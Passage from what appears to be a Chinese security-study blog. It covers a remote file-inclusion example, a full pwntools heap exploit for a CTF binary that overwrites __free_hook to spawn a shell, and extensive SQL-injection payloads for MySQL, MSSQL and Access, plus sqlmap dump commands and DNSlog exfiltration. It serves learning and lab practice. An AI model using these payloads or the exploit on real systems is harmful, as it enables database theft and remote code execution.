<p>http: //127.0.0.1:8080/include.php?filename=http: // <a target="_blank" rel="noopener" href="http://www.xiaodi8.com/readme.txt%23">www.xiaodi8.com/readme.txt%23</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=http">http://127.0.0.1:8080/include.php?filename=http</a> : / / <a target="_blank" rel="noopener" href="http://www.xiaodi8.com/readme.txt">www.xiaodi8.com/readme.txt</a>?</p>
<p>4.利用协议</p>
<p><img src="https://s2.loli.net/2022/03/17/gj34CBEueso2SQN.png"><br><img src="https://s2.loli.net/2022/03/17/JiyrHRaT7t4kbqV.png"></p>
<p><img src="https://s2.loli.net/2022/03/17/qdJtRvQZz26bI84.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">各种php伪协议的用法</a></p>
<p><img src="https://s2.loli.net/2022/03/17/QMfcirHUBoJqIXK.png"></p>
<p>5.靶场训练</p>
<p>无论直接访问还是利用参数访问，都执行了页面代码。也可根据页面代码发现存在文件包含漏洞</p>
<p><img src="https://s2.loli.net/2022/03/17/toUjdvHncDLAChk.png"><br><img src="https://s2.loli.net/2022/03/17/xUDFEfliCq15QkA.png"></p>
<p>利用php伪协议查看目录</p>
<p><img src="https://s2.loli.net/2022/03/17/DL2w8VPSEjHFz3Z.png"></p>
<p>利用php伪协议查看文件，查看源代码</p>
<p><img src="https://s2.loli.net/2022/03/17/JVjBeZEQdunqNzI.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl13rha6v0001gsv86a6u5lrs" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-tcathe_修改fd" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/" class="article-date">
  <time datetime="2022-03-16T10:19:57.832Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/">tcache结构体</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>利用修改tcache的fd，从而使得tcache</p>
<p>先看一下tcache的源代码：</p>
<p>tcache_get()：</p>
<pre><code>static __always_inline void *
tcache_get (size_t tc_idx)
&#123;
  tcache_entry *e = tcache-&gt;entries[tc_idx];
  assert (tc_idx &lt; TCACHE_MAX_BINS);
  assert (tcache-&gt;entries[tc_idx] &gt; 0);
  tcache-&gt;entries[tc_idx] = e-&gt;next;
  --(tcache-&gt;counts[tc_idx]);
  return (void *) e;
&#125;</code></pre>
<hr>
<p>tcache_put()：</p>
<pre><code>tcache_put (mchunkptr chunk, size_t tc_idx)
&#123;
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx &lt; TCACHE_MAX_BINS);
  e-&gt;next = tcache-&gt;entries[tc_idx];
  tcache-&gt;entries[tc_idx] = e;
  ++(tcache-&gt;counts[tc_idx]);
&#125;</code></pre>
<p>可见tcache-&gt;counts[tc_idx]会记录tcache的个数，所以可以通过溢出来控制该参数，从而达到使得本该进入tchche的堆块进入unsortbin.</p>
<p>以华东杯cpp2为例</p>
<p>先泄露堆的地址，不多赘述 了</p>
<pre><code>for i in range(2):
   ad(i,0x67)

ad(2,0x67)
rm(0)
rm(1)
dp(1)
ru(&#39;\n&#39;)
heap = u64(rx(6).ljust(8,b&#39;\x00&#39;)) - 0x12EC0 + 0x10
li(&quot;heap-----&gt;&quot;+hex(heap))</code></pre>
<p>重点说一下这里</p>
<pre><code>md(1,p64(heap))
ad(3,0x67)
ad(4,0x67)

md(4,b&#39;\x00&#39;*0x48+b&#39;\x00&#39;*6+b&#39;\x07&#39;)

rm(3)
rm(4)
dp(4)</code></pre>
<p>一定要先free(3),再free(4)</p>
<p>free掉3后chunk_3会进入tcache，free掉4后tcache-&gt;counts[tc_idx]会全部修改。而这个tcache可以为2之后的攻击提供条件。</p>
<p>如果先free_4，再free_3,chunk_3会进入fastbin,将难以利用tcache_attack</p>
<p>先free(3),再free(4)<br><img src="https://s2.loli.net/2022/03/16/T1e4lxmUbQS7WFO.png"></p>
<p>先free(4),再free(3)<br><img src="https://s2.loli.net/2022/03/16/asAXNzOSptmofBY.png"></p>
<p>之后泄露则利用进入unsortbin的chunk_4</p>
<p>chunk_4的size为0x290是因为tcache结构体为0x290,就是这个</p>
<p><img src="https://s2.loli.net/2022/03/16/zPmtB4yuw15WZUF.png"></p>
<p>最后exp如下</p>
<hr>
<pre><code>#! /usr/bin/python3
from pwn import *
import time
context.arch = &#39;amd64&#39;
context.log_level = &#39;debug&#39;

one = []
elf = ELF(&#39;./cpp2&#39;)
#io = remote(&#39;47.104.143.202&#39;,15348)
#libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
io = process(&#39;./cpp2&#39;)
libc = elf.libc

r   =  lambda x : io.recv(x)
rx  =  lambda x: io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
one = []

def ad(idx,size):
 sla(&#39;&gt;&gt;&#39;,str(1))
 sla(&#39;I:&gt;&gt;&#39;,str(idx))
 sla(&#39;S:&gt;&gt;&#39;,str(size))

def md(idx,con):
 sla(&#39;&gt;&gt;&#39;,str(2))
 sla(&#39;I:&gt;&gt;&#39;,str(idx))
 sla(&#39;V:&gt;&gt;&#39;,con)

def rm(idx):
 sla(&#39;&gt;&gt;&#39;,str(4))
 sla(&#39;I:&gt;&gt;&#39;,str(idx))

def dp(idx):
 sla(&#39;&gt;&gt;&#39;,str(3))
 sla(&#39;I:&gt;&gt;&#39;,str(idx))

#-----------------------

for i in range(2):
   ad(i,0x67)

ad(2,0x67)
rm(0)
rm(1)
dp(1)
ru(&#39;\n&#39;)
heap = u64(rx(6).ljust(8,b&#39;\x00&#39;)) - 0x12EC0 + 0x10
li(&quot;heap-----&gt;&quot;+hex(heap))

md(1,p64(heap))
ad(3,0x67)
ad(4,0x67)

md(4,b&#39;\x00&#39;*0x48+b&#39;\x00&#39;*6+b&#39;\x07&#39;)

rm(3)
rm(4)
dp(4)
base = u64(ru(b&#39;\x7f&#39;)[-5:] + b&#39;\x7f\x00\x00&#39;)
base = base - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;]
li(&quot;base-----&gt;&quot;+hex(base))
system = base + libc.sym[&#39;system&#39;]
free = base + libc.sym[&#39;__free_hook&#39;]
#bin_sh = bases + libc.search(b&#39;/bin/sh\x00&#39;)
li(&quot;system-----&gt;&quot;+hex(system))
li(&quot;free-----&gt;&quot;+hex(free))

md(3,p64(free))
ad(5,0x67)
ad(6,0x67)
md(5,b&#39;/bin/sh\x00&#39;)
md(6,p64(system))
rm(5)
io.interactive()</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/16/tcathe_%E4%BF%AE%E6%94%B9fd/" data-id="cl0tfx5gf0000awv85q5fh5n6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/sql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-03-16T08:13:35.200Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/sql%E6%B3%A8%E5%85%A5/">Web学习 sql注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>知识点:<br>在MYsQL5.o以上版本中,mysql存在一个自带数据库名为<br>information_schema，它是一个存储记录有所有数掘库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。</p>
<p><img src="https://s2.loli.net/2022/03/06/j2SEkoWpRh7VgfL.png"></p>
<p>information_schema.tables:     记录所有表名信息的表<br>information_schema.columns:    记录所有列名信息的表</p>
<p>table__name :表名<br>column_name:列名<br>table_schema:数据库名</p>
<p>group_concat(table_name)   查询所有的表名</p>
<p>猜解列名数量（字段数)<br>    order by x  (x 变动,查看网页是否正常)</p>
<pre><code>http://219.153.49.228:48354/new_list.php?id=1 order by 1</code></pre>
<p>报错猜解准备（查看可显示的字段）</p>
<pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select 1,2,3,4

信息收集:

数据库版本: version()
数据库名字: database()
数据库用户: user()
操作系统:   @@version_compile_os

http://219.153.49.228:48354/new_list.php?id=-1 union select 1,database(),3,version()</code></pre>
<hr>
<h1 id="高版本MYSQL利用information-schema库的注入"><a href="#高版本MYSQL利用information-schema库的注入" class="headerlink" title="高版本MYSQL利用information_schema库的注入"></a>高版本MYSQL利用information_schema库的注入</h1><p>必要知识点:<br>在MYSQL5.0以上版本中，mysql存在一个自带数据库名为<br>information_schema, 它是一个存储记录有所有数据库名，表名，列名的数据<br>库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。<br>低版本只能暴力猜解</p>
<p>数据库中符号”. “代表下一级，如xiao.user表示xiao数据库下的user表名</p>
<p>information_schema.tables    :记录所有表名信息的表<br>information_schema.columns   :记录所有列名信息的表</p>
<p>table__name :表名<br>column_name:列名<br>table_schema:数据库名</p>
<p>group_concat(table_name)   查询所有的表名</p>
<hr>
<p>查询指定数据库名mozhe_Discuz_stormGroup下的表名信息:</p>
<pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,group_concat (table_name),3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_stormGroup&quot;</code></pre>
<p>查询指定表名stormGroup_member下的列名信息:</p>
<pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,group_concat (column_name),3,4 from information_schema.column where table_name=&#39;stormGroup_member&#39;</code></pre>
<p>查询指定数据信息:</p>
<pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,name , password,4 from stormGroup_membor</code></pre>
<p>猜解多个数据可以采用1imit x,1变动猜解</p>
<pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,name , password,4 from stormGroup_membor limit x,1  (x变动)</code></pre>
<hr>
<hr>
<p>高权限注入</p>
<p>获取所有数据库名:</p>
<pre><code>http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1 union select 1,group_concat(schema_name) ,3 from information_schema.schemata</code></pre>
<p>获取指定qqyw数据库名下的表名信息:</p>
<pre><code>union select i, group_concat (table_name) , 3 from information_schema.tables where table_achema=&#39;qqyw&#39;</code></pre>
<p>获取指定qqyw下的表名admin下的列名信息:</p>
<pre><code>union select1,group_concat (column_name),3,4 from information_schema.column where table_name=&#39;admin&#39; and information_schema=&#39;qqyw&#39;</code></pre>
<p>获取指定qayw下的admin数据</p>
<pre><code>union select 1, u, p,4 from qqyw.admin</code></pre>
<h1 id="根据sql脚本的语法判断’’是否需要绕过"><a href="#根据sql脚本的语法判断’’是否需要绕过" class="headerlink" title="根据sql脚本的语法判断’’是否需要绕过"></a>根据sql脚本的语法判断’’是否需要绕过</h1><p>select *from user where id=’1’<br>select *from user where name=’xiaodi’<br>$name=$_GET[‘’];<br>$sql=”select * from user where name=’$name ‘ “;<br>?x=xiaodi and 1=1<br>select * from user where name=’xiaodi and 1=1’</p>
<hr>
<h1 id="SQL-server-MSSQL注入语句"><a href="#SQL-server-MSSQL注入语句" class="headerlink" title="SQL server / MSSQL注入语句"></a>SQL server / MSSQL注入语句</h1><p>1.判断数据库类型  </p>
<pre><code>and exists (select * from sysobjects)--返回正常为mssql（也名sql server）
and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</code></pre>
<p>2.判断数据库类型</p>
<pre><code>and 1 = @@version-- 有回显时使用。
and substring((select @@version),22,4)=&#39;2008&#39;-- 适用于无回显模式，后面的2008就是数据库版本,返回正常及是该版本，否则修改版本再尝试。</code></pre>
<p>3.获取数据库的个数</p>
<pre><code>1. and 1=(select quotename(count(name)) from master..sysdatabases)--
2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --
3. and 1=(select str(count(name))%2b&#39;|&#39; from master..sysdatabases where dbid&gt;5) --
        and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --
说明：dbid从1-4的数据库一般为系统数据库.</code></pre>
<p>5.获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用</p>
<pre><code>and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;))--
and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;))--</code></pre>
<p>6.获取当前数据库  </p>
<pre><code>and db_name()&gt;0
and 1=(select db_name())--</code></pre>
<p>7.获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于    mssql2005及以上版本）】</p>
<pre><code>and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;))-- 
and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..sysobjects where xtype=&#39;U&#39;  FOR XML PATH(&#39;&#39;))--</code></pre>
<p>8.获得表里的列一次爆指定表的所有列（只限于mssql2005及以上版本）：</p>
<pre><code>and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;))-- 
and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;))--</code></pre>
<p>9.获取指定数据库中的表的列的数据库</p>
<p>逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：</p>
<pre><code>and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#39;&#39;))--</code></pre>
<p>一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：</p>
<pre><code>and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(&#39;&#39;))--复制代码第一条语句：and  1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(&#39;&#39;))--加上where条件筛选结果出来会更加好，如：where  and name like &#39;%user%&#39;  就会筛选出含有user关键词的出来。用在筛选表段时很不错。</code></pre>
<h1 id="PostgraSQL注入语句"><a href="#PostgraSQL注入语句" class="headerlink" title="PostgraSQL注入语句"></a>PostgraSQL注入语句</h1><p><a target="_blank" rel="noopener" href="https://www.webshell.cc/524.html">https://www.webshell.cc/524.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a></p>
<h1 id="Oracle注入语句"><a href="#Oracle注入语句" class="headerlink" title="Oracle注入语句"></a>Oracle注入语句</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
<h1 id="MongoDB注入语句"><a href="#MongoDB注入语句" class="headerlink" title="MongoDB注入语句"></a>MongoDB注入语句</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33881753/article/details/87981552">https://blog.csdn.net/weixin_33881753/article/details/87981552</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/3278.html">https://www.secpulse.com/archives/3278.html</a></p>
<p>#手工注入流程</p>
<p>高版本也可以利用information_schema库来注入（详细见上）</p>
<h2 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h2><pre><code>1.找到注入点 and 1=1 and 1=2 测试报错
2.order by 5 # 到5的时候报错，获取字段总数为4
3.id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息
4.获取数据库信息
user() ==&gt;root
database() ==&gt;mozhe_Discuz_StormGroup
version() ==&gt;5.7.22-0ubuntu0.16.04.1
5.获取数据库表
table_name 表名
information_schema.tables 系统生成信息表
table_schema=数据库名16进制或者用单引号括起来
改变limit 0，1中前一个参数，得到两个表 StormGroup_member notice
6.获取列名
结果如下 id,name,password,status
7.脱裤</code></pre>
<h2 id="Access："><a href="#Access：" class="headerlink" title="Access："></a>Access：</h2><p>由于access数据库结构不同，一般只能通过暴力猜解的方式注入</p>
<pre><code>1.and 1=2 报错找到注入点
2.order by 获取总字段
3.猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表
4.猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在
5.脱裤 union select 1,username,passwd,4 from admin</code></pre>
<h2 id="MSSQL："><a href="#MSSQL：" class="headerlink" title="MSSQL："></a>MSSQL：</h2><pre><code>1.and 1=2报错
2.order by N# 获取总字段
3.猜表名 and exists(select * from manage) 表名manage存在
4.猜解列名 and exists(select id from manage) 列名id存在，同样username,password也存在
5.脱裤 and exists (select id from manage where id=1 ) 证明id=1存在
and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8
and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16
可用Burp的Intruder功能辅助猜解
猜解username第1到8位的字符，ASCII转码 admin_mz
猜解password第1到16位的字符，ASCII转码(Burp 爆破)
转ASCII的py脚本：
72e1bfc3f01b7583 MD5解密为97285101</code></pre>
<h1 id="SQL注入—报错盲注"><a href="#SQL注入—报错盲注" class="headerlink" title="SQL注入—报错盲注"></a>SQL注入—报错盲注</h1><p>基于布尔的SQL盲注-逻辑判断（优先级：2）<br>regexp,like,ascii,left,ord,mid</p>
<p>基于时间的SQL盲注-延时判断（优先级：3）<br>if,sleep</p>
<p>基于报错的SQL盲注-报错回显（优先级：1）<br>floor，updatexml，extractvalue</p>
<h2 id="基于报错的SQL盲注-报错回显"><a href="#基于报错的SQL盲注-报错回显" class="headerlink" title="基于报错的SQL盲注-报错回显"></a>基于报错的SQL盲注-报错回显</h2><p>floor<br>payload:<br>pikachu  insert</p>
<h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><p>username=x’ or(select 1 from(select count(*),concat((select(select (select  concat(0x7e,database(),0x7e))) from  information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘<br>&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei &amp;submit=submit</p>
<h3 id="updatexml-个人觉得是最方便的"><a href="#updatexml-个人觉得是最方便的" class="headerlink" title="updatexml (个人觉得是最方便的)"></a>updatexml (个人觉得是最方便的)</h3><p>username=x ‘ or updatexml(1,concat(0x7e,(version())),0) or ‘ &amp; password=xiaodi &amp;                 sex=%E7%94%B7 &amp; honenum=13878787788 &amp; email=wuhan &amp; add=hubei &amp; submit=submit</p>
<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p>username=x ‘ or extractvalue(1,concat(0x7e,database())),0) or ‘ </p>
<h2 id="基于时间的SQL盲注-延时判断"><a href="#基于时间的SQL盲注-延时判断" class="headerlink" title="基于时间的SQL盲注-延时判断"></a>基于时间的SQL盲注-延时判断</h2><p>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+</p>
<p>substr截取字符串的第一位，共一位字符，若其ascii码为115，则休眠5s</p>
<p>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)–+</p>
<pre><code>select table_name from information_schema.tables where table_schema=database() limit 0,1
查询information_schema.tables 表中数据库为当前数据库的，索引从0开始的,共一位的数据</code></pre>
<h2 id="基于布尔的SQL盲注-逻辑判断"><a href="#基于布尔的SQL盲注-逻辑判断" class="headerlink" title="基于布尔的SQL盲注-逻辑判断"></a>基于布尔的SQL盲注-逻辑判断</h2><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
<p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-8/?id=1&#39;and">http://127.0.0.1/Less-8/?id=1&#39;and</a> (length(database()))&gt;10 –+</p>
<p>count(*)计数   concat()连接字符   floor()重复数据，返回0,1两个值  group by 进行分组 rand(0)避免数据重复造成的错误</p>
<p>猜当前数据库第一个字符</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1&#39;and">http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1&#39;and</a> ascii(substr(database(),1,1))&gt;114#</p>
<p>利用二分法，115为fal，114TRUE，数据库第一个字符ASCII为115，即s</p>
<h1 id="焯，使用sqlmap"><a href="#焯，使用sqlmap" class="headerlink" title="焯，使用sqlmap"></a>焯，使用sqlmap</h1><h2 id="爆出数据库版本"><a href="#爆出数据库版本" class="headerlink" title="爆出数据库版本"></a>爆出数据库版本</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> </p>
<p><img src="https://s2.loli.net/2022/03/01/OfUJD3qLcesRwbu.png"><br><img src="https://s2.loli.net/2022/03/01/SRLcVU1bFf2Jh8A.png"></p>
<h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -dbs</p>
<p><img src="https://s2.loli.net/2022/03/01/QCekclNzJTOVKs5.png"><br><img src="https://s2.loli.net/2022/03/01/NfGzwEdOvR5FkMW.png"></p>
<h2 id="爆当前数据库"><a href="#爆当前数据库" class="headerlink" title="爆当前数据库"></a>爆当前数据库</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> –current-db</p>
<p><img src="https://s2.loli.net/2022/03/01/L796beYEjtSvDNH.png"></p>
<h2 id="爆出security下的表名"><a href="#爆出security下的表名" class="headerlink" title="爆出security下的表名"></a>爆出security下的表名</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -D security –tables</p>
<p><img src="https://s2.loli.net/2022/03/01/aFtXWoBU4xd1gr3.png"></p>
<h2 id="爆出security下users表的列名"><a href="#爆出security下users表的列名" class="headerlink" title="爆出security下users表的列名"></a>爆出security下users表的列名</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -D security -T users –columns   </p>
<p><img src="https://s2.loli.net/2022/03/01/uja1UoKBnme2DtW.png"><br><img src="https://s2.loli.net/2022/03/01/qD1sw3NTgj4Khrk.png"></p>
<h2 id="爆出指定列下的数据"><a href="#爆出指定列下的数据" class="headerlink" title="爆出指定列下的数据"></a>爆出指定列下的数据</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -D security -T users -C id,username,password –dump</p>
<p><img src="https://s2.loli.net/2022/03/01/pc6tR7XxKfkTzsv.png"><br><img src="https://s2.loli.net/2022/03/01/AV4SY9tfZHWwKJL.png"></p>
<h1 id="加解密注入，二次注入，DNSlog注入"><a href="#加解密注入，二次注入，DNSlog注入" class="headerlink" title="加解密注入，二次注入，DNSlog注入"></a>加解密注入，二次注入，DNSlog注入</h1><h2 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h2><p>get或post传输参数时可能采用了base64的加密方式将参数传输给服务器</p>
<p>比如<a target="_blank" rel="noopener" href="http://www.xxx.com/index.php?id=MQ==">www.xxx.com/index.php?id=MQ==</a><br>加密部分：MQ==<br>解密结果：1 相当于id=1</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ol>
<li>原理</li>
</ol>
<p>二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，</p>
<p>当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。详细点来讲，就是在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc </p>
<p>对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，</p>
<p>直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，</p>
<p>就形成了二次注入。二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞的。</p>
<ol start="2">
<li>过程</li>
<li>第一步：插入恶意数据</li>
</ol>
<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
<p>第二步：引用恶意数据</p>
<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
<ol start="3">
<li>过程原理图</li>
</ol>
<p><img src="https://s2.loli.net/2022/03/06/zPjwLygYqstWTbm.png"></p>
<ol start="4">
<li>思路</li>
</ol>
<p>a. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</p>
<p>b. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p>
<p>c. 黑客向服务端发送第二个与第一次不相同的请求数据信息。</p>
<p>d. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</p>
<p>e. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><ol>
<li>原理<br>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，</li>
</ol>
<p>这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，</p>
<p>来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p>
<ol start="2">
<li><p>利用场景</p>
</li>
<li><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNSlog注入。</p>
</li>
<li><p>推荐平台</p>
</li>
</ol>
<p>a. <a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
<p>b. <a target="_blank" rel="noopener" href="http://ceye.io/%EF%BC%88%E9%9C%80%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89">http://ceye.io/（需要注册）</a>    </p>
<p>c. <a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p>
<h2 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h2><pre><code>Sqlmap注入Base64编码的注入点：
https://www.bbsmax.com/A/A2dmVVQBze/
https://www.freebuf.com/column/184587.html
https://www.cnblogs.com/renhaoblog/p/12912452.html
https://www.pianshen.com/article/9561325277/
https://github.com/bugscanteam/dnslog/(自己搭建dnslog服务器)</code></pre>
<h2 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h2><h3 id="cooke注入"><a href="#cooke注入" class="headerlink" title="cooke注入"></a>cooke注入</h3><p>先找出所有的库名</p>
<p>union select 1,2,group_concat(schema_name) from information_schema.schemata#</p>
<p><img src="https://s2.loli.net/2022/03/06/biKfB6y5zR7YxMs.png"><br><img src="https://s2.loli.net/2022/03/06/OnCseyB71EpkVJf.png"></p>
<p>再爆出security下的表名</p>
<p>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
<p>再爆出表下有什么字段</p>
<p>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
